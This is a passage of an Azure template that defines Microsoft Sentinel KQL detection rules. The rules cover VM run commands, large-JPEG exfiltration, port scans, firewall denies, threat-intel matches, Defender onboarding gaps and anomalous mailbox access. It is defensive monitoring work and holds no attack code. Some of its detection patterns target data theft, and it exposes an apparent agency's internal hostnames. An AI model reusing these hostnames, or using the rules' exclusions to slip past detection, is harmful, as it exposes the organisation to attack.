          "displayName": "BV-1623: [RBA] AzureActivity - Run Command On VM",
          "description": "This alerts when there's any event indicating commands being run on a VM MITRE: T1059 Category: Azure Activity tag: RBA",
          "severity": "Low",
          "enabled": true,
          "query": "let alert_id = 'BV-1623:';\nlet latency = 1h;\nlet start_time = 1h;\nlet end_time = now();\nlet alert_bin = 1h;\nlet start_time_suppress = 1d;\nlet global_config = dynamic({\n  'EXCLUSION': dynamic([{}])\n});\nlet exclusions = array_concat(global_config['EXCLUSION'], BV1623_CONFIG['EXCLUSION'], dynamic([{}]));\nlet rba_score = coalesce(toreal(global_config['RBASCORE']), toreal(BV1623_CONFIG['RBASCORE']),1.0);\nlet rba_score_calculator = (table_parameter: (visibility:dynamic), RuleId_constant:string){\n    let global_override = toscalar(bv_rba_global_override | where Status == 'prod' | where RuleId == RuleId_constant | summarize arg_max(TimeGenerated, GlobalRBAMultiplier, GlobalOverrideRBA) by RuleId | project bag_pack('GlobalRBAMultiplier',GlobalRBAMultiplier,'GlobalOverrideRBA',GlobalOverrideRBA));\n    let client_override = toscalar(BV_RBA_CLIENT_OVERRIDE | where Status == 'prod' | where RuleId == RuleId_constant | summarize arg_max(TimeGenerated, ClientRBAMultiplier, ClientOverrideRBA) by RuleId | project bag_pack('ClientRBAMultiplier',ClientRBAMultiplier,'ClientOverrideRBA',ClientOverrideRBA));\n    table_parameter\n    | extend rba_multiplier = coalesce(toreal(client_override['ClientRBAMultiplier']),toreal(global_override['GlobalRBAMultiplier']), 1.0)\n    | extend rba_multiplier = iff(rba_multiplier < 0.1, 0.1, rba_multiplier)\n    | extend rba_multiplier = iff(rba_multiplier > 3, 3.0, rba_multiplier)\n    | extend rba_override = coalesce(toreal(client_override['ClientOverrideRBA']),toreal(global_override['GlobalOverrideRBA']), toreal(rba_score), 1.0)\n    | extend ModifiedRBAScore = toreal(rba_override) * rba_multiplier\n    | extend ModifiedRBAScore = case(\n      ModifiedRBAScore > 10, 10.0\n      , ModifiedRBAScore <0.1, 0.1\n      , ModifiedRBAScore\n    )\n    | extend bv_alarm_rba_score = iff(visibility contains '1', 0.0, ModifiedRBAScore)\n};\nlet description = (table_parameter: (*)){\n  table_parameter\n  | extend all_data = pack_all(false)\n  | extend keys = bag_keys(all_data)\n  | mv-apply k = keys to typeof(string) on (\n      extend dynamic_entity = parse_json(all_data[k])\n      | extend ExtendedDescription = iff(k startswith 'bv_' and k != 'bv_raw',strcat(\n      case(gettype(dynamic_entity) == 'array' and isnotempty(array_sort_desc(all_data[k])[0]) , strcat(k, ': \\n* ', substring(strcat_array(array_slice(all_data[k],0,3),'\\n* '),0,100), '\\n')\n      , strcat(k,': ', all_data[k])\n      )\n      ),'')\n      | summarize ExtendedDescription = make_set(ExtendedDescription), k = make_set(k)\n  )\n  | extend ExtendedDescription=strcat_array(ExtendedDescription, \"\\n \")\n};\nlet exclusion_filter = (table_parameter: (*)){\n      table_parameter\n      | extend all_data = pack_all()\n      | mv-apply e = exclusions on (\n          extend keys = bag_keys(e)\n          | extend key_count = iff(keys contains 'metadata', array_length(keys) -1, array_length(keys))\n          | mv-apply k = keys to typeof(string) on (\n              extend list = split(e[k],',')\n              | mv-apply l = list to typeof(string) on (\n                  extend item = iff(gettype(todynamic(all_data[k])) != 'array', pack_array(all_data[k]), todynamic(all_data[k]))\n                  | mv-apply i = item to typeof(string) on (\n                      extend compare = i contains l or ipv6_is_match(tostring(all_data[k]),l)\n                      | summarize excluded_count = countif(compare)\n                      | extend item_excluded = excluded_count > 0\n                  )\n                  | summarize excluded_count = countif(item_excluded)\n                  | extend item_excluded = excluded_count > 0\n              )\n              | summarize excluded_list_item = countif(item_excluded > 0)\n          )\n          | extend exclusion_matched =  key_count == excluded_list_item and key_count != 0\n          | extend visibility = iff(isnotempty(e.metadata[\"visibility\"]), e.metadata[\"visibility\"], 2)\n          | extend bv_exclusion_reason = iff(exclusion_matched, parse_json(e.metadata).reason, '')\n          | summarize exclusion_matched=make_set(exclusion_matched), visibility=make_set(visibility), bv_exclusion_reason = make_set_if(bv_exclusion_reason, isnotempty(bv_exclusion_reason))\n      )\n      | extend drop_event = iff(exclusion_matched contains \"true\", true, false)\n      | where not(drop_event)\n};      \nAzureActivity\n|where TimeGenerated between (ago(start_time + latency) .. end_time) and ingestion_time() > ago(start_time)\n| where OperationNameValue has 'virtualMachines/runCommand/action' and ActivityStatusValue =~ 'Success'\n| parse _ResourceId with * '/virtualmachines/' bv_src_dvc\n| where bv_src_dvc !has '/' and isnotempty(bv_src_dvc)\n| summarize \n    bv_start_time = min(TimeGenerated)\n    , bv_end_time = max(TimeGenerated)\n    , bv_event_count = count()\n    , bv_src_dvc = make_set(bv_src_dvc, 20)\n    , bv_src_dvc_count = dcount(bv_src_dvc)\n    , bv_src_ip = make_set(CallerIpAddress, 20)\nby \n    bv_user = Caller\n| extend bv_dedup_hash = hash_sha1(strcat(bv_user))\n| where BV_FUN_DEDUP(alert_id, start_time_suppress) !has bv_dedup_hash \n| extend\n    bv_alert_time = now()\n    , bv_vendor_product = 'AzureActivity'\n    , sourcetype = 'AzureActivity'\n| invoke exclusion_filter()\n| invoke rba_score_calculator('BV-1623')\n| invoke description()\n| extend bv_alarm_victim_entities = pack_array(bv_cim_normalize_username(bv_user))\n| extend bv_alarm_attacker_entities = pack_array(bv_cim_normalize_username(bv_user))\n      , bv_src_dvc1 = bv_src_dvc[0]\n      , bv_src_dvc2 = bv_src_dvc[1]\n      , bv_src_dvc3 = bv_src_dvc[2]\n| project-keep\n    bv_*\n    , sourcetype\n    , ExtendedDescription    ",
          "queryFrequency": "PT1H",
          "queryPeriod": "P1D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT6H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "Execution"
          ],
          "techniques": [
            "T1059"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": false,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT1H",
              "matchingMethod": "Selected",
              "groupByEntities": [
                "Account"
              ],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "AlertPerResult"
          },
          "alertDetailsOverride": {
            "alertDisplayNameFormat": "BV-1623: [RBA] AzureActivity - Run Command On VM By User {{bv_user}}",
            "alertDescriptionFormat": "This alerts when there's any event indicating commands being run on a VM\n\n{{ExtendedDescription}}\n\nMITRE: T1059\nCategory: Azure Activity\ntag: RBA"
          },
          "customDetails": {
            "VictimEntity": "bv_alarm_victim_entities",
            "AttackerEntity": "bv_alarm_attacker_entities",
            "RBAScore": "bv_alarm_rba_score",
            "bv_dedup_hash": "bv_dedup_hash"
          },
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "Name",
                  "columnName": "bv_user"
                }
              ]
            },
            {
              "entityType": "Host",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "bv_src_dvc1"
                }
              ]
            },
            {
              "entityType": "Host",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "bv_src_dvc2"
                }
              ]
            },
            {
              "entityType": "Host",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "bv_src_dvc3"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/c6b28e6a-5251-4da5-adb4-d1468962a968')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/c6b28e6a-5251-4da5-adb4-d1468962a968')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "JPEG  files Anomaly Detection",
          "description": "Malicious actors sometimes use non-suspicious file types like images to exfiltrate data or evade detection. This query looks for the downloading of abnormally large JPEG files from a source where large JPEG files have not been downloaded.\n    Ref: https://www.microsoft.com/security/blog/2022/07/27/untangling-knotweed-european-private-sector-offensive-actor-using-0-day-exploits/'\nCreated/Added on 10/23/2024 by Alex Mayor",
          "severity": "Medium",
          "enabled": false,
          "query": "let percentile = 95;\nlet lookback_data = materialize(CommonSecurityLog\n| where TimeGenerated between(ago(7d)..ago(1d))\n| where FileType == \"Jpeg Files\" or RequestURL endswith \".jpg\"\n| where isnotempty(RequestURL));\nlet domains = lookback_data | summarize by DestinationHostName;\nCommonSecurityLog\n| where TimeGenerated > ago(1d)\n| where FileType =~ \"Jpeg Files\" or RequestURL endswith \".jpg\"\n| where isnotempty(RequestURL)\n| extend filename = split(RequestURL, \"/\")[-1]\n| where ReceivedBytes > toscalar(lookback_data\n| summarize percentile(ReceivedBytes, percentile))\n| project-reorder TimeGenerated, filename, RequestURL, ReceivedBytes, RequestClientApplication, SourceUserName, DestinationHostName, RequestContext \n| where DestinationHostName !in (domains) or isempty(DestinationHostName)\n",
          "queryFrequency": "P1D",
          "queryPeriod": "P2D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT5H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [],
          "techniques": [],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5H",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": null,
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/761f0256-5708-40c4-9d53-ce1360b7855f')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/761f0256-5708-40c4-9d53-ce1360b7855f')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "[DCSS Custom] F5_AFM Excessive Connections to Critical Ports with Threat Intelligence Correlation",
          "description": "This rule monitors network traffic to detect potentially suspicious activity targeting critical ports. It identifies source IPs making an unusually high number of connection attempts to critical ports within a short timeframe and checks whether those IPs are present in a threat intelligence database.",
          "severity": "Medium",
          "enabled": true,
          "query": "let critical_ports = dynamic([22, 3389, 445, 8080, 1433, 1521]); \nF5Telemetry_AFM_CL \n| where TimeGenerated > ago(15m) \n| where dest_port_s in (critical_ports) \n| summarize conn_count = count() by source_ip_s, dest_port_s, bin(TimeGenerated, 10m) \n| where conn_count > 20 \n| join kind=leftouter ( \n    ThreatIntelligenceIndicator \n    | where Active == true  // Ensuring only active threat indicators \n    | project NetworkSourceIP \n) on $left.source_ip_s == $right.NetworkSourceIP \n| extend TI_Found = iff(isnotempty(NetworkSourceIP), true, false) \n| project TimeGenerated, source_ip_s, dest_port_s, TI_Found \n\n",
          "queryFrequency": "PT5H",
          "queryPeriod": "PT5H",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT5H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [],
          "techniques": [],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5H",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": null,
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/10e06606-ef85-43f2-83a3-64ee13fa1858')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/10e06606-ef85-43f2-83a3-64ee13fa1858')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "[DCSS Custom] F5_AFM_Port Scanning & Reconnaissance Activity with TI Match",
          "description": "This rule detects potential port scanning activities by monitoring unique destination ports accessed by a single source IP within a short time frame. It identifies IPs that attempt connections to more than 10 unique ports within a 5-minute window. Additionally, it correlates these IPs with active threat intelligence indicators to determine whether they are associated with known threats.",
          "severity": "Medium",
          "enabled": true,
          "query": "F5Telemetry_AFM_CL \n| where TimeGenerated > ago(10m) \n| summarize port_count = dcount(dest_port_s) by source_ip_s, bin(TimeGenerated, 5m) \n| where port_count > 10 \n| join kind=leftouter ( \n    ThreatIntelligenceIndicator \n    | where Active == true  // Ensuring only active threat indicators \n    | project NetworkSourceIP \n) on $left.source_ip_s == $right.NetworkSourceIP \n| extend TI_Found = iff(isnotempty(NetworkSourceIP), true, false) \n| project TimeGenerated, source_ip_s, port_count, TI_Found \n",
          "queryFrequency": "PT5H",
          "queryPeriod": "PT5H",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT5H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [],
          "techniques": [],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5H",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": null,
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/050ee508-77d2-46c8-9bc7-3d57b59746a3')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/050ee508-77d2-46c8-9bc7-3d57b59746a3')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "[DCSS Custom] F5_AFM_Excessive Firewall Denies",
          "description": "Detects IPs being blocked more than 10 times in 10 minutes, which may indicate a brute-force attack, DoS attempt, or misconfiguration.",
          "severity": "Medium",
          "enabled": true,
          "query": "F5Telemetry_AFM_CL \n| where TimeGenerated > ago(10m) \n| where action_s == \"Deny\"  \n| summarize deny_count = count() by source_ip_s, bin(TimeGenerated, 5m) \n| where deny_count > 10 \n| join kind=leftouter ( \n ThreatIntelligenceIndicator \n    | where Active == true  // Ensuring only active threat indicators \n | project NetworkSourceIP \n) on $left.source_ip_s == $right.NetworkSourceIP \n| extend TI_Found = iff(isnotempty(NetworkSourceIP), true, false) \n| project TimeGenerated, source_ip_s, deny_count, TI_Found \n",
          "queryFrequency": "PT5H",
          "queryPeriod": "PT5H",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT5H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [],
          "techniques": [],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5H",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": null,
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/3329e634-4286-4887-8f42-615460df7d44')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/3329e634-4286-4887-8f42-615460df7d44')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "ACTIVE - TI Map IP Entity to VMConnection",
          "description": "Replaced the existing \"TI Map Entity to VMConnection\" rule. It improves threat detection by adding security logs. It has been refined to identify suspicious activity by matching threat intelligence indicators (TI_ipEntity) with recent VM connections and \"CommonSecurityLogs\". It checks if any connections linked to known threats were \"denied\",\"built\", or \"teardown\" based on \"ActionType\". This rule is being tested first to confirm its effectiveness.",
          "severity": "Medium",
          "enabled": true,
          "query": "// The query_now parameter represents the time (in UTC) at which the scheduled analytics rule ran to produce this alert.\n//\n// Adjust this value along with `SrcIPAddr` for additional traffic insights on suspicious IPs.\nlet dt_lookBack = 1h; // Look back 1 hour for VMConnection events. \n//\n//\nlet ioc_lookBack = 14d; // Look back 14 days for threat intelligence indicators\nlet IP_Indicators = ThreatIntelligenceIndicator\n    | where isnotempty(NetworkIP)\n        or isnotempty(EmailSourceIpAddress)\n        or isnotempty(NetworkDestinationIP)\n        or isnotempty(NetworkSourceIP)\n    | where TimeGenerated >= ago(ioc_lookBack)\n    | extend TI_ipEntity = iff(isnotempty(NetworkIP), NetworkIP, NetworkDestinationIP)\n    | extend TI_ipEntity = iff(isempty(TI_ipEntity) and isnotempty(NetworkSourceIP), NetworkSourceIP, TI_ipEntity)\n    | extend TI_ipEntity = iff(isempty(TI_ipEntity) and isnotempty(EmailSourceIpAddress), EmailSourceIpAddress, TI_ipEntity)\n    | where ipv4_is_private(TI_ipEntity) == false\n        and TI_ipEntity !startswith \"fe80\"\n        and TI_ipEntity !startswith \"::\"\n        and TI_ipEntity !startswith \"127.\"\n    | summarize LatestIndicatorTime = arg_max(TimeGenerated, *) by IndicatorId\n    | where Active == true and ExpirationDateTime > now();\n// Perform a join between IP indicators and VMConnection events\nlet VM_Matches = IP_Indicators\n    | join kind=innerunique (\n        VMConnection\n        | where TimeGenerated >= ago(dt_lookBack)\n        | extend VMConnection_TimeGenerated = TimeGenerated\n        )\n        on $left.TI_ipEntity == $right.RemoteIp\n    | where VMConnection_TimeGenerated < ExpirationDateTime\n    | summarize VMConnection_TimeGenerated = arg_max(VMConnection_TimeGenerated, *) by IndicatorId, RemoteIp, TI_ipEntity;\n// Join with CommonSecurityLog to analyze if the connection was denied, built, or had teardown actions\nVM_Matches\n| join kind=innerunique (\n    CommonSecurityLog\n    | where TimeGenerated >= ago(dt_lookBack)\n    | extend CS_ipEntity = SourceIP // Assign SourceIP to CS_ipEntity\n    | where Message contains \"deny\"\n        or Message contains \"built\"\n        or Message contains \"teardown\" or Activity contains \"TRAFFIC\"// Filter for action messages\n    | extend ActionType = case(\n                          Message contains \"deny\",\n                          \"Denied\",\n                          Message contains \"built\",\n                          \"Built\",\n                          Message contains \"teardown\",\n                          \"Teardown\",\n                          \"Unknown\"\n                      )\n    //\n    // Uncomment and replace `SourceIP` with a specific IP for focused analysis.\n    //| where SourceIP == \"REPLACE WITH TI_ipEntity or MaliciousIp\" \n    //                 \n    | extend CommonSecurityLog_TimeGenerated = TimeGenerated\n    )\n    on $left.TI_ipEntity == $right.CS_ipEntity\n| where CommonSecurityLog_TimeGenerated < ExpirationDateTime\n| summarize CommonSecurityLog_TimeGenerated = arg_max(CommonSecurityLog_TimeGenerated, *) by IndicatorId, TI_ipEntity, ActionType\n| where DeviceAction != \"Deny\"\n// Single project statement for final output fields\n| project\n    timestamp = CommonSecurityLog_TimeGenerated,\n    VMConnection_TimeGenerated,\n    IndicatorId,\n    ThreatType,\n    Description,\n    TI_ipEntity,\n    MaliciousIp,\n    SourcePort,\n    Direction,\n    Computer,\n    DestinationIp,\n    DestinationPort,\n    DeviceVendor,\n    Reason,\n    DeviceAction,\n    DeviceEventClassID,\n    Message,\n    HostName = tostring(split(Computer, '.', 0)[0]),\n    DnsDomain = tostring(strcat_array(array_slice(split(Computer, '.'), 1, -1), '.'))",
          "queryFrequency": "PT3H",
          "queryPeriod": "P14D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT5H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [],
          "techniques": [],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5H",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": {
            "alertDynamicProperties": []
          },
          "customDetails": {},
          "entityMappings": [
            {
              "entityType": "Host",
              "fieldMappings": [
                {
                  "identifier": "HostName",
                  "columnName": "HostName"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/c173e191-83bd-4317-b344-d20a49325b61')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/c173e191-83bd-4317-b344-d20a49325b61')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "[DCSS CUSTOM] Non-Onboarded Devices in Defender",
          "description": "Identifies non-onboarded device in Defender",
          "severity": "Medium",
          "enabled": true,
          "query": "// Step 1: Extract onboarded devices that have MergedDeviceIds (Windows 11 upgraded devices)\nlet OnboardedDevices = DeviceInfo\n| where OnboardingStatus == \"Onboarded\"  // Get only onboarded devices\n| where isnotempty(MergedDeviceIds)  // Ensure they have merged IDs (indicating an upgrade)\n| mv-expand MergedDeviceId = todynamic(MergedDeviceIds)  // Expand MergedDeviceIds into multiple rows\n| extend MergedDeviceId = tostring(MergedDeviceId)  // Convert to string for proper join\n| project DeviceName, MergedDeviceId;  // Keep only necessary fields for matching\n// Step 2: Get non-onboarded devices and exclude those with a matching DeviceId in MergedDeviceIds\nDeviceInfo\n| where DeviceName !in (\"vdihyperion.dcss.gov\", \"vdihyperion2.dcss.gov\")\n| where OSPlatform != \"Linux\"\n| where OnboardingStatus != \"Unsupported\"\n| where OnboardingStatus != \"Onboarded\"  // Focus only on devices that are not onboarded\n| extend DeviceIdStr = tostring(DeviceId)  // Convert DeviceId to string for comparison\n| join kind=leftanti (OnboardedDevices) on $left.DeviceName == $right.DeviceName and $left.DeviceIdStr == $right.MergedDeviceId\n// --- Exclude devices that have already been sent for onboarding or are confirme user laptops--- \n// Comment the line below if you want to review the status of un-suppressed device list\n| where DeviceName !in (\"vmhubwinsnmid01\", \n                        \"OnboardingDevice2\",\n                        \"vmhubwindc003.dcss.gov\",\n                        \"cmdcssw1094.dcss.gov\",\n                        \"cmdcssw1095.dcss.gov\",\n                        \"vmhubwindc004.dcss.gov\",\n                        \"vmhubwincvcs002.dcss.gov\",\n                        \"vmhubwincvma002.dcss.gov\",\n                        \"vdi-066.dcss.gov\",\n                        \"vmhubwinsnmid01.dcss.gov\",\n                        \"vmhubwincvma002.dcss.gov\",\n                        \"l132184.dcss.gov\",\n                        \"l129786.dcss.gov\",\n                        \"vmhubwinadm002.dcss.gov\",\n                        \"vmhubwtbpixprd1.dcss.gov\",\n                        \"vdidev-106.dcss.gov\",\n                        \"l129782.dcss.gov\",\n                        \"melodyslaptop\",//Personal laptop\n                        \"l129751.dcss.gov\",\n                        \"sh128788\"\n                        ) \n//\n| summarize LatestSeen=max(TimeGenerated), \n            LatestDeviceId=arg_max(TimeGenerated, DeviceId, OSPlatform, OnboardingStatus, OSDistribution, OSVersionInfo, Vendor, ExposureLevel, LoggedOnUsers) \n  by DeviceName\n| order by LatestSeen desc\n",
          "queryFrequency": "PT12H",
          "queryPeriod": "PT12H",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT5H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [],
          "techniques": [],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5H",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": null,
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/42655305-921e-4122-8745-883fa6075bc5')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/42655305-921e-4122-8745-883fa6075bc5')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "TestRule--Anomalous use of MailItemAccess by GraphAPI",
          "description": "# Anomalous use of MailItemAccess by GraphAPI [Nobelium]\n\nThis query looks for anomalies in mail item access events made by Graph API. It uses standard deviation to determine if the number of events is anomalous. The query returns all clientIDs where the amount of mail sent per day was larger than value given by the formula, `average + STDThreshold(2.5)*(standard deviation)`.\n\nSee [*The MailItemsAccessed mailbox auditing action*](https://docs.microsoft.com/en-us/microsoft-365/compliance/mailitemsaccessed-forensics-investigations?view=o365-worldwide#the-mailitemsaccessed-mailbox-auditing-action).",
          "severity": "Medium",
          "enabled": true,
          "query": "let starttime = 30d;\r\nlet STDThreshold = 2.5;\r\nlet allMailAccsessByGraphAPI = CloudAppEvents\r\n| where   ActionType == \"MailItemsAccessed\"\r\n| where Timestamp between (startofday(ago(starttime))..now())\r\n| where isnotempty(RawEventData['ClientAppId'] ) and RawEventData['AppId'] has \"00000003-0000-0000-c000-000000000000\"\r\n| extend ClientAppId = tostring(RawEventData['ClientAppId'])\r\n| extend OperationCount = toint(RawEventData['OperationCount'])\r\n| project Timestamp,OperationCount , ClientAppId;\r\nlet calculateNumberOfMailPerDay = allMailAccsessByGraphAPI\r\n| summarize NumberOfMailPerDay =sum(toint(OperationCount)) by ClientAppId,format_datetime(Timestamp, 'y-M-d');\r\nlet calculteAvgAndStdev=calculateNumberOfMailPerDay\r\n| summarize avg=avg(NumberOfMailPerDay),stev=stdev(NumberOfMailPerDay) by ClientAppId;\r\ncalculteAvgAndStdev  | join calculateNumberOfMailPerDay on ClientAppId\r\n| sort by ClientAppId\r\n|  where NumberOfMailPerDay > avg + STDThreshold * stev\r\n| project ClientAppId,Timestamp,NumberOfMailPerDay,avg,stev",
          "queryFrequency": "PT5H",
          "queryPeriod": "PT5H",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT5H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "Exfiltration"
          ],
          "techniques": [],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5H",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": {
            "alertDynamicProperties": []
          },
          "customDetails": {},
          "entityMappings": null,
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/0a0c8f12-7926-4fb2-88a6-317e5bdd081a')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/0a0c8f12-7926-4fb2-88a6-317e5bdd081a')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "[DCSS_CUSTOM] - Detection of Untrusted Parent Processes Spawning fontdrvhost.exe",
          "description": "This analytics rule identifies occurrences where the fontdrvhost.exe process is initiated by parent processes that are not in the predefined list of trusted system processes. Since fontdrvhost.exe is a legitimate Windows component involved in font rendering, its exploitation by malicious actors can indicate attempts to execute unauthorized code or manipulate font handling mechanisms for malicious purposes. By detecting such anomalies, this rule aids in identifying potential security threats.",
          "severity": "High",
          "enabled": true,
